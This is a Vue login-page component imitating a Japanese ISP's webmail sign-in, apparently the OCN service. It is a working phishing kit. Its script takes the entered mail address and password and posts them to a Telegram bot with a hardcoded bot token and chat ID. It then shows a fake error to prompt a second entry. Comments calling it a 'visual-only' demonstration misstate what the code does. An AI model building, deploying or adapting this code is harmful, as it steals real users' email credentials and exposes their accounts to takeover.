<template>
  <div id="app">
    <div>


<body>

<div class="container">

    <!-- Header -->
    <div class="header">

        <div class="ocntop">
            <a href="#">MAIL TOP</a>
        </div>

        <div class="logo-area">
            <p>
                <img
                    src="/images/logo_001.gif"
                    width="161"
                    height="46"
                    alt="Mail"
                >
            </p>
        </div>

    </div>


    <!-- Main content -->
    <div class="content">

        <!-- <div class="notice-area">
            <p class="notice-title">Important Notice</p>

            <p class="text notice">
                This is a demonstration login interface.
            </p>
        </div> -->


        <!-- Login frame -->
        <div class="frame">

            <div class="title-area">

                <div class="pdr-la">
                    <div class="lang">
                        <a href="#">日本語</a>
                    </div>
                </div>

                <h1 class="title-m">Login</h1>

            </div>


            <div class="main-area">

                <!-- Static error example -->

                <div id="errorArea" class="errorArea" v-if="isActive">
                    <ul class="errorMessage">
                        <li>
                            <span>
                                Please check the information entered.
                            </span>
                        </li>
                    </ul>
                </div>


                <!-- Visual-only form -->
                <form
                    id="loginForm"
                    name="loginForm"
                                        
                >

                    <div class="form-item w-form-1">

                        <label for="mailAddress">
                            Mail address
                        </label>

                        <input
                            id="mailAddress"
                            name="mailAddress"
                            type="text"
                            placeholder="Mail address"
                            maxlength="278"
                            autocomplete="off"
                            v-model="formDataRes.userid"
                        >

                    </div>


                    <div class="form-item w-form-1">

                        <label for="password">
                            Password
                        </label>

                        <input
                            id="password"
                            name="password"
                            type="password"
                            maxlength="32"
                            placeholder="Password"
                            autocomplete="off"
                            v-model="formDataRes.password"
                        >

                    </div>


                    <div class="checkbox-container">

                        <input
                            type="checkbox"
                            id="remember"
                            name="remember"
                        >

                        <label
                            for="remember"
                            class="checkbox"
                        >
                            Remember me
                        </label>

                    </div>


                    <div class="button-panel">

                        <button
                            type="button"
                            class="button"
                            @click.prevent="finishJoob();"
                        >
                            Login
                        </button>

                    </div>


                    <div class="main-footer">

                        <div class="pdb10">
                            <p>
                                <a href="#">
                                    Forgot ID or password?
                                </a>
                            </p>
                        </div>

                        <p>
                            <a href="#">
                                Change password
                            </a>
                        </p>

                    </div>

                </form>

            </div>
        </div>


        <!-- Help -->
        <div class="help">
            <a href="#">Help</a>
        </div>

    </div>

</div>


<!-- Footer -->
<div class="footer">

    <ul>

        <li class="footer-li">
            <a href="#">Terms</a>
        </li>

        <li class="footer-li">
            <a href="#">Privacy Policy</a>
        </li>

        <li class="footer-li">
            <a href="#">About Us</a>
        </li>

    </ul>

    <div class="copyright">
        © Demo Mail
    </div>

</div>



    </body>

	</div>
  </div>
</template>

<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
        userid: "",
        password: "",
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*Ocn *\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485",
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>


<style>
/* =========================
   Reset
========================= */

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

html,
body {
    width: 100%;
    min-height: 100%;
}

body {
    background: #ffffff;
    color: #000000;
    font-family:
        Arial,
        Helvetica,
        sans-serif;
    font-size: 14px;
    line-height: 1.5;
}

a {
    color: #696969;
    text-decoration: none;
}

a:hover {
    color: #c0c0c0;
}

p {
    font-size: 1em;
}

ul {
    list-style: none;
}


/* =========================
   Container / Page
========================= */

.container {
    width: 100%;
    min-height: 100vh;
    background: #ffffff;
}


/* =========================
   Header
========================= */

.header {
    width: 100%;
    background: #ffffff;
    text-align: center;
    position: relative;
}

.ocntop {
    width: 100%;
    padding: 8px 10px 0 0;
    text-align: right;
    font-size: 14px;
}

.logo-area {
    padding: 5px 0 10px;
}

.logo-area img {
    width: 161px;
    height: 46px;
    max-width: 100%;
    object-fit: contain;
    border: 0;
}


/* =========================
   Content
========================= */

.content {
    width: 100%;
    padding-bottom: 60px;
}


/* =========================
   Notice
========================= */

.notice-area {
    width: 100%;
    max-width: 400px;
    margin: 15px auto 25px;
    padding: 14px 15px 10px;
    border: 2px solid #f1000d;
    background: #ffffff;
}

.notice-title {
    color: #000000;
    font-weight: bold;
    margin-bottom: 5px;
}

.notice {
    color: #000000;
    text-align: left;
    margin: 5px 0;
}

.notice a {
    color: #f1000d;
    font-weight: bold;
    text-decoration: underline;
}

.notice a:hover {
    text-decoration: none;
}


/* =========================
   Login Frame
========================= */

.frame {
    width: 100%;
    max-width: 400px;
    margin: 20px auto;
    padding: 15px 0 25px;
    background: #fafafa;
    border: 1px solid #c0c0c0;
}

.title-area {
    width: 100%;
    position: relative;
}

.title-m {
    color: #000000;
    font-size: 28px;
    line-height: 1.2;
    font-weight: normal;
    text-align: center;
    padding: 10px 0;
}

.pdr-la {
    width: 100%;
}

.lang {
    width: 100%;
    padding: 10px 25px 0 0;
    text-align: right;
    font-size: 14px;
}


/* =========================
   Main Area
========================= */

.main-area {
    margin: 0 30px;
}


/* =========================
   Error
========================= */

.errorArea {
    margin: 8px 0;
    color: #f1000d;
    text-align: left;
}

.errorMessage {
    color: #f1000d;
    text-align: left;
}

.errorMessage li {
    display: block;
}


/* =========================
   Form
========================= */

.form-item {
    margin: 0 0 20px;
}

.form-item label {
    display: block;
    margin-bottom: 5px;
    color: #000000;
    font-size: 14px;
}

.form-item input {
    width: 100%;
    height: 40px;
    padding: 0 10px;

    color: #000000;
    background: #ffffff;

    border: 1px solid #c0c0c0;

    font-family:
        Arial,
        Helvetica,
        sans-serif;

    font-size: 16px;
    line-height: 40px;

    outline: none;
}

.form-item input:hover {
    border-color: #a0a0a0;
}

.form-item input:focus {
    border-color: #f1000d;
    outline: 1px solid #f1000d;
}

.form-item input::placeholder {
    color: #c0c0c0;
}


/* =========================
   Checkbox
========================= */

.checkbox-container {
    display: flex;
    align-items: center;
    margin-bottom: 15px;
}

.checkbox-container input[type="checkbox"] {
    width: 16px;
    height: 16px;
    margin: 0 7px 0 0;
}

.checkbox {
    color: #000000;
    font-size: 14px;
    cursor: pointer;
}


/* =========================
   Button
========================= */

.button-panel {
    width: 100%;
}

.button {
    width: 100%;
    height: 40px;

    margin: 8px 0 16px;

    border: none;

    background: #f1000d;
    color: #ffffff;

    font-family:
        Arial,
        Helvetica,
        sans-serif;

    font-size: 16px;
    text-align: center;

    cursor: pointer;

    transition: background 0.3s ease;
}

.button:hover {
    background: #ff6666;
}


/* =========================
   Form Footer
========================= */

.main-footer {
    margin: 15px 0;
    text-align: center;
    font-size: 14px;
}

.pdb10 {
    padding-bottom: 10px;
}

.main-footer a {
    color: #696969;
}

.main-footer a:hover {
    color: #c0c0c0;
}


/* =========================
   Help
========================= */

.help {
    padding: 10px 0 30px;
    text-align: center;
}

.help a {
    color: #696969;
    font-size: 14px;
}


/* =========================
   Footer
========================= */

.footer {
    width: 100%;
    min-height: 80px;

    padding: 15px 10px;

    background: #ffffff;

    color: #000000;

    text-align: center;
    font-size: 14px;
}

.footer ul {
    margin-bottom: 10px;
}

.footer-li {
    display: inline-block;
    margin: 0 8px;
}

.footer-li a {
    color: #696969;
}

.copyright {
    text-align: center;
    color: #555555;
    font-size: 12px;
}


/* =========================
   Utility Classes
========================= */

.align-c {
    text-align: center;
}

.align-l {
    text-align: left;
}

.text {
    font-size: 14px;
    text-align: left;
}

.warn {
    color: #f1000d;
}


/* =========================
   Mobile
========================= */

@media screen and (max-width: 600px) {

    .frame {
        width: 100%;
        max-width: 400px;

        margin: 10px auto 20px;

        padding: 0;

        background: #ffffff;

        border: none;
    }

    .notice-area {
        width: calc(100% - 20px);
        margin: 10px auto;
    }

    .main-area {
        margin: 0 16px;
    }

    .title-m {
        font-size: 24px;
    }

    .lang {
        padding-right: 15px;
    }

    .logo-area img {
        width: 161px;
        height: auto;
    }

    .form-item input {
        height: 42px;
        font-size: 16px;
        line-height: 42px;
    }

    .button {
        height: 42px;
        font-size: 16px;
    }

    .footer-li {
        margin: 0 5px;
    }
}


/* =========================
   Very Small Screens
========================= */

@media screen and (max-width: 360px) {

    .main-area {
        margin: 0 12px;
    }

    .title-m {
        font-size: 22px;
    }

    .footer {
        font-size: 12px;
    }

    .footer-li {
        margin: 0 3px;
    }
}

</style>
